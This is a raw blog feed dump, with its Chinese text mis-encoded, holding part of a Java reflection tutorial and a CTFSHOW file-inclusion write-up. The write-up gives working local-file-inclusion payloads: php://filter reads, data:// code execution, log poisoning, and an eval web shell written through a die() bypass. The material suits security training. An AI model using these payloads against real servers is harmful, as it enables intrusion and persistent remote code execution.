java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è·å–å…¬æœ‰çš„å±æ€§</span></span><br><span class="line">Field[] public_personfields = c.getFields();</span><br><span class="line"> <span class="keyword">for</span>(Field f:public_personfields)&#123;</span><br><span class="line">     System.out.println(f);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><strong>è¾“å‡ºç»“æœ</strong></p><p><img src="/img/Java%E5%8F%8D%E5%B0%84/java_02.png" alt=""></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è·å–ç§æœ‰å’Œå…¬æœ‰çš„å±æ€§</span></span><br><span class="line">Field[] private_personfields = c.getDeclaredFields();</span><br><span class="line"><span class="keyword">for</span>(Field f:private_personfields)&#123;</span><br><span class="line">    System.out.println(f);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>è¾“å‡ºç»“æœ</strong></p><p><img src="/img/Java%E5%8F%8D%E5%B0%84/java_03.png" alt=""></p><p><strong>ç»¼ä¸Šï¼Œæˆ‘ä»¬å‘ç°åŠ äº†<code>Declared</code>çš„ï¼Œä¼šæŠŠæ‰€æœ‰å±æ€§çš„å˜é‡éƒ½æ‰“å°å‡ºæ¥</strong></p><p>é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜å¯ä»¥æ ¹æ®å˜é‡åæ¥è·å–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">namefield</span> <span class="operator">=</span> c.getField(<span class="string">&quot;name&quot;</span>);<span class="comment">// è·å–nameå±æ€§</span></span><br><span class="line">namefield.set(p,<span class="string">&quot;Patrick&quot;</span>);<span class="comment">// å°è¯•æ”¹å˜nameçš„å€¼ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºè¦æ”¹å˜çš„ç±»çš„å®ä¾‹ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºæ”¹å˜çš„å€¼</span></span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">agefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;age&quot;</span>);<span class="comment">// è·å–ageç§æœ‰å±æ€§</span></span><br><span class="line">agefield.setAccessible(<span class="literal">true</span>);<span class="comment">// å…è®¸è®¿é—®ç§æœ‰çš„å±æ€§</span></span><br><span class="line">agefield.set(p,<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">System.out.println(p);</span><br></pre></td></tr></table></figure><p><strong>è¾“å‡ºç»“æœ</strong></p><p><img src="/img/Java%E5%8F%8D%E5%B0%84/java_04.png" alt=""></p><h1 id="è¡¥å……"><a href="#è¡¥å……" class="headerlink" title="è¡¥å……"></a>è¡¥å……</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(String className, String methodName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"> <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(className);</span><br><span class="line"> clazz.getMethod(methodName).invoke(clazz.newInstance());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>è·å–ç±»çš„â½…æ³•ï¼š <code>forName</code> </li><li>å®ä¾‹åŒ–ç±»å¯¹è±¡çš„â½…æ³•ï¼š <code>newInstance</code> </li><li>è·å–å‡½æ•°çš„â½…æ³•ï¼š <code>getMethod</code> </li><li>æ‰§â¾å‡½æ•°çš„â½…æ³•ï¼š <code>invoke</code></li></ul><p><code>forName</code> ä¸æ˜¯è·å–â€œç±»â€çš„å”¯â¼€é€”å¾„ï¼Œé€šå¸¸æ¥è¯´æœ‰å¦‚ä¸‹ä¸‰ç§â½…å¼è·å–â¼€ä¸ªâ€œç±»â€ï¼Œä¹Ÿå°±æ˜¯ <code>java.lang.Class</code> å¯¹è±¡ï¼š</p><ul><li><code>obj.getClass()</code> å¦‚æœä¸Šä¸‹â½‚ä¸­å­˜åœ¨æŸä¸ªç±»çš„å®ä¾‹ obj ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡ <code>obj.getClass()</code> æ¥è·å–å®ƒçš„ç±» </li><li><code>Test.class</code> å¦‚æœä½ å·²ç»åŠ è½½äº†æŸä¸ªç±»ï¼Œåªæ˜¯æƒ³è·å–åˆ°å®ƒçš„ <code>java.lang.Class</code> å¯¹è±¡ï¼Œé‚£ä¹ˆå°±ç›´æ¥ æ‹¿å®ƒçš„ <code>class</code> å±æ€§å³å¯ã€‚è¿™ä¸ªâ½…æ³•å…¶å®ä¸å±äºåå°„ã€‚ </li><li><code>Class.forName</code> å¦‚æœä½ çŸ¥é“æŸä¸ªç±»çš„åå­—ï¼Œæƒ³è·å–åˆ°è¿™ä¸ªç±»ï¼Œå°±å¯ä»¥ä½¿â½¤ <code>forName</code> æ¥è·å–</li></ul><p>forNameæœ‰ä¸¤ä¸ªå‡½æ•°é‡è½½ï¼š</p><ul><li><code>Class&lt;?&gt; forName(String name)</code></li><li><code>Class&lt;?&gt; forName(String name, **boolean** initialize, ClassLoader loader)</code></li></ul><p>ç¬¬â¼€ä¸ªå°±æ˜¯æœ€å¸¸â»…çš„è·å–classçš„â½…å¼ï¼Œå¯ä»¥ç†è§£ä¸ºç¬¬â¼†ç§â½…å¼çš„â¼€ä¸ªå°è£…ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(className)</span><br><span class="line"><span class="comment">// ç­‰äº</span></span><br><span class="line">Class.forName(className, <span class="literal">true</span>, currentLoader)</span><br></pre></td></tr></table></figure><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œ <code>forName</code> çš„ç¬¬â¼€ä¸ªå‚æ•°æ˜¯ç±»åï¼›ç¬¬â¼†ä¸ªå‚æ•°è¡¨ç¤ºæ˜¯å¦åˆå§‹åŒ–ï¼›ç¬¬ä¸‰ä¸ªå‚æ•°å°± æ˜¯ <code>ClassLoader</code> </p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFSHOW æ–‡ä»¶åŒ…å«</title>
      <link href="/2023/08/13/CTFSHOW%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
      <url>/2023/08/13/CTFSHOW%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="web78-php-filter"><a href="#web78-php-filter" class="headerlink" title="web78(php://filter)"></a>web78(php://filter)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¹³å¹³æ— å¥‡çš„æ–‡ä»¶åŒ…å«ï¼Œç›´æ¥åˆ©ç”¨ä¼ªåè®®è¿›è¡Œè¯»å–</p><p><code>paylaod: ?file=php://filter/read=convert.base64-encode/resource=flag.php</code></p><h1 id="web79-data"><a href="#web79-data" class="headerlink" title="web79(data://)"></a>web79(data://)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¼ªåè®®è¿‡æ»¤ï¼Œå¸¦æœ‰phpçš„ä¼ªåè®®ä¸èƒ½ç”¨äº†ï¼Œä½†æ˜¯å¯ä»¥åˆ©ç”¨å…¶ä»–ä¼ªåè®®</p><p>åˆ©ç”¨<code>data://</code></p><p>payloadï¼š</p><p><code>?file=data://text/plain,&lt;?= system(&#39;cat f*&#39;);?&gt;</code></p><h1 id="web80-æ—¥å¿—"><a href="#web80-æ—¥å¿—" class="headerlink" title="web80(æ—¥å¿—)"></a>web80(æ—¥å¿—)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯æ¶å•Šã€‚<code>data://</code>ä¹Ÿä¸è®©ç”¨äº†</p><p>å¯ä»¥å®ç°æ—¥å¿—åŒ…å«</p><p><code>?file=/var/log/nginx/access.log</code></p><p>æˆåŠŸè¯»å–æ—¥å¿—æ–‡ä»¶</p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/80.png" alt=""></p><p>å°†ä¸€å¥è¯æœ¨é©¬å†™åœ¨UAå¤´ä¸­ï¼Œå¹¶æµ‹è¯•</p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/80_01.png" alt=""></p><p>æˆåŠŸæ‰§è¡Œï¼</p><p>æœ€ç»ˆpayload</p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/80_02.png" alt=""></p><h1 id="web81"><a href="#web81" class="headerlink" title="web81()"></a>web81()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°†<code>:</code>è¿‡æ»¤äº†ï¼Œä½†æ˜¯ä¸å½±å“æˆ‘ä»¬çš„æ—¥å¿—åŒ…å«</p><p>payloadåŒä¸Š</p><h1 id="web82"><a href="#web82" class="headerlink" title="web82()"></a>web82()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ¬¡åˆç¦ç”¨äº†<code>.</code>ï¼Œæ‰€ä»¥åŒ…å«æ— åç¼€çš„æ–‡ä»¶åªæœ‰sessionæ–‡ä»¶</p><p>ï¼ˆ<strong>ç«äº‰ç¯å¢ƒéœ€è¦æ™šä¸Š11ç‚¹30åˆ†è‡³æ¬¡æ—¥7æ—¶30åˆ†ä¹‹é—´åšï¼Œå…¶ä»–æ—¶é—´ä¸å¼€æ”¾ç«äº‰æ¡ä»¶</strong>ï¼‰</p><p>æ—¶é—´ä¸åœ¨è¿™åŒºé—´ï¼Œåªèƒ½å…ˆæ”¾ç€ï¼Œåç»­å†æ¥è¡¥å……</p><h1 id="web83"><a href="#web83" class="headerlink" title="web83()"></a>web83()</h1><h1 id="web84"><a href="#web84" class="headerlink" title="web84()"></a>web84()</h1><h1 id="web85"><a href="#web85" class="headerlink" title="web85()"></a>web85()</h1><h1 id="web86"><a href="#web86" class="headerlink" title="web86()"></a>web86()</h1><h1 id="web87-die-å’Œexit-æ­»äº¡ç»•è¿‡"><a href="#web87-die-å’Œexit-æ­»äº¡ç»•è¿‡" class="headerlink" title="web87(die()å’Œexit()æ­»äº¡ç»•è¿‡)"></a>web87(die()å’Œexit()æ­»äº¡ç»•è¿‡)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;å¤§ä½¬åˆ«ç§€äº†&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PHPåœ¨è§£ç base64æ—¶ï¼Œé‡åˆ°ä¸åœ¨å…¶ä¸­çš„å­—ç¬¦æ—¶ï¼Œä¼šé€‰æ‹©è·³è¿‡è¿™äº›å­—ç¬¦ï¼Œå°†æœ‰æ•ˆçš„å­—ç¬¦é‡æ–°ç»„æˆå­—ç¬¦ä¸²è¿›è¡Œè§£ç </p><p>ç”±äºæ­»äº¡ä¹‹exitä¸­çš„ä»£ç ï¼Œå­—ç¬¦<code>&lt;ã€?ã€;ã€&gt;ã€</code>ç©ºæ ¼ç­‰å­—ç¬¦ä¸ç¬¦åˆbase64è§£ç èŒƒå›´ï¼Œæœ€ç»ˆè§£ç ç¬¦åˆè¦æ±‚çš„åªæœ‰<code>phpdie</code>è¿™7ä¸ªå­—ç¬¦ï¼Œè€Œbase64åœ¨è§£ç çš„æ—¶å€™ï¼Œæ˜¯4ä¸ªå­—èŠ‚ä¸€ç»„ï¼Œå› æ­¤è¿˜å°‘ä¸¤ä¸ªï¼Œæ‰€ä»¥æˆ‘ä»¬å°†è¿™ä¸¤ä¸ªæ·»åŠ ä¸Šå»</p><ul><li>base64ç¼–ç ç»•è¿‡ï¼š</li></ul><p><code>?file=php://filter/convert.base64-decode/resource=1.php&amp;content=aaPD9waHAgZXZhbCgkX1BPU1RbYV0pOw==</code></p><p>å› ä¸ºé¢˜ç›®è¿˜æœ‰ä¸ª<code>urldecode</code>æ‰€ä»¥è¿˜è¦è¿›è¡Œç¼–ç ï¼ˆç¼–ç ä¸¤æ¬¡ï¼‰</p><p>å¯†ç ä¸º<code>1</code>ï¼Œèšå‰‘è¿æ¥ï¼Œæ‹¿åˆ°flag</p><p>æœ€ç»ˆpayload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?file=%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">61</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">63</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">66</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">64</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">65</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span></span><br><span class="line">    </span><br><span class="line">content=aaPD9waHAgZXZhbCgkX1BPU1RbMV0pOw==</span><br><span class="line"><span class="comment">// contentå†…å®¹ä¸º aa+base64(&lt;?php eval($_POST[1]);)</span></span><br></pre></td></tr></table></figure><h1 id="web88"><a href="#web88" class="headerlink" title="web88()"></a>web88()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥ä½¿ç”¨<code>data://</code>ä¼ªåè®®ï¼Œbase64ç¼–ç åçš„<code>=</code>å»æ‰</p><p>payload</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdubCBmbDBnLnBocCcpPz4</span></span><br></pre></td></tr></table></figure><h1 id="web116"><a href="#web116" class="headerlink" title="web116()"></a>web116()</h1><p>æ‰“å¼€åå‘ç°æ˜¯æ®µè§†é¢‘ï¼Œæä¾›äº†ä¸‹è½½åŠŸèƒ½ï¼Œå…ˆä¸‹è½½ä¸‹æ¥ï¼Œç”¨010æ‰“å¼€åæ²¡ä»€ä¹ˆç‰¹æ®Šçš„å‘ç°ï¼Œå› ä¸ºæç¤ºè¯´æœ‰miscçš„çŸ¥è¯†ç‚¹ï¼Œå°è¯•ä¸€ä¸‹æ–‡ä»¶æ–‡ä»¶åˆ†ç¦»</p><p>åˆ©ç”¨å‘½ä»¤<code>foremost ä¸‹è½½.mp4</code></p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/116.png" alt=""></p><p>åˆ†ç¦»æˆåŠŸï¼Œå¹¶ä¸”å‘ç°å­˜åœ¨pngæ–‡ä»¶</p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/116_01.png" alt=""></p><p>å‘ç°pngæ–‡ä»¶æ˜¯ä¸€æ®µä»£ç </p><p>ä»£ç è¿‡æ»¤äº†ä¸€äº›ç‰¹æ®Šå­—ç¬¦ä¸²</p><p>å°è¯•ä¼ å‚<code>?file=flag.php</code></p><p>å‘ç°è§†é¢‘æ‰“ä¸å¼€äº†ï¼Œä¸”æ²¡ä»€ä¹ˆä¿¡æ¯ï¼Œå°è¯•æŠ“ä¸ªåŒ…çœ‹çœ‹</p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/116_03.png" alt=""></p><p>æ‹¿åˆ°flag</p><p><code>payload: ?file=flag.php</code></p><h1 id="web117"><a href="#web117" class="headerlink" title="web117()"></a>web117()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;</span>,<span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;contents&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="string">&quot;&lt;?php die();?&gt;&quot;</span>.<span class="variable">$contents</span>);</span><br></pre></td></tr></table></figure><p>ç›´æ¥ç»™æºç äº†ï¼Œåˆæ˜¯ä¸€ä¸ª<code>die</code>æ­»äº¡ç»•è¿‡ï¼Œä½†æ˜¯æŠŠ<code>base64</code>å’Œ<code>rot13</code>è¿‡æ»¤äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span 